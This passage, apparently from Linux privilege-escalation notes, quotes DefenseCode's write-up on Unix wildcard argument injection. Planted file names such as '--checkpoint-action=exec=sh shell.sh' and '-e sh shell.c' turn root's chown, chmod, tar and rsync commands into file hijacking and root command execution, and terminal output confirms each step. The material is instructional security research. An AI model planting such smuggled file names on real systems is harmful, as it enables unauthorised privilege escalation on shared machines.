Flask-CouchDB (0.2.1)
helloworld-script (0.1, /tmp/helloworld)
Jinja2 (2.10)
```

**npm**

npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer [npm fails to restrict the actions of malicious npm packages](https://www.kb.cert.org/vuls/id/319816)
, [npm install could be dangerous: Rimrafall](https://github.com/joaojeronimo/rimrafall) and [Package install scripts vulnerability](https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability)

## Unix Wildcards

The below text is directly from the [DefenseCode Unix WildCards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt).

### Chown file reference trick (file owner hijacking)

First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.

```none
[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
```

Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.

```none
[root@defensecode public]# chown -R nobody:nobody \*.php
```

Let's see who owns files now...

```none
root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php
```

Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.

```none
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
```

Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.

Let's check chown manual page (man chown):

```none
--reference=RFILE     use RFILE's owner and group rather than specifying OWNER:GROUP values
```

So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)

To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically "hijack" files that are of interest to us.

Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.

### Chmod file reference trick

Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):

```none
--reference=RFILE    :   use RFILE's mode instead of MODE values
```

Example is presented below.

```none
[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
```

Superuser will now try to set mode 000 on all files.

```none
[root@defensecode public]# chmod 000 *
```

Let's check permissions on files...

```none
[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php
```

What happened? Instead of 000, all files are now set to mode 777 because of the '--reference' option supplied through file name..Once again,file .drf.php owned by user 'leon' with mode 777 was used as reference file and since --reference option is supplied, all files will be set to mode 777. Beside just --reference option, attacker can also create another file with '-R' filename, to change file permissions on files in all subdirectories recursively.

### Tar arbitrary command execution
  
Previous example is nice example of file ownership hijacking. Now, let's go to even more interesting stuff like arbitrary command execution. Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:

```none
[root@defensecode public]# tar cvvf archive.tar *
```

So, what's the problem with 'tar'? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let's check tar manual page (man tar):

```none
--checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)
--checkpoint-action=ACTION : execute ACTION on each checkpoint
```

There is '--checkpoint-action' option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.

Check the following directory:

```none
[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
```

Now, for example, root user wants to create archive of all files in current directory.

```none
[root@defensecode public]# tar cf archive.tar *
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command execution under root privileges. Once again, there are few files created by user 'leon'.

```none
-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 'tar' program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.
```

```none
[root@defensecode public]# cat shell.sh
/usr/bin/id
```

So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the 'root' account above.

### Rsync arbitrary command execution

Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very common on Unix systems. If we check 'rsync' manual page, we can again find options that can be abused for arbitrary command execution.

Rsync manual: "You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote."

Interesting rsync option from manual:

```none
-e, --rsh=COMMAND       specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

Let's abuse one example directly from the 'rsync' manual page. Following example will copy all C files in local directory to a remote host 'foo' in '/src' directory.

```none
# rsync -t *.c foo:src/
```

Directory content:

```none
[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
```

Now root will try to copy all C files to the remote server.

```none
[root@defensecode public]# rsync -t *.c foo:src/

rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]
```

Let's see what happened...

```none
[root@defensecode public]# ls -al
total 76
drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
drwx------. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
```

There were two files owned by user 'leon', as listed below.

```none
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
```

After 'rsync' execution, new file shell\_output.txt whose owner is root is created in same directory.

```none
-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
```

If we check its content, following data is found.

```none
[root@defensecode public]# cat shell_output.txt
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Trick is that because of the '\*.c' wildcard, 'rsync' got '-e sh shell.c' option on command line, and shell.c will be executed upon'rsync' start. Content of shell.c is presented below.

```none
[root@defensecode public]# cat shell.c
/usr/bin/id > shell_output.txt
```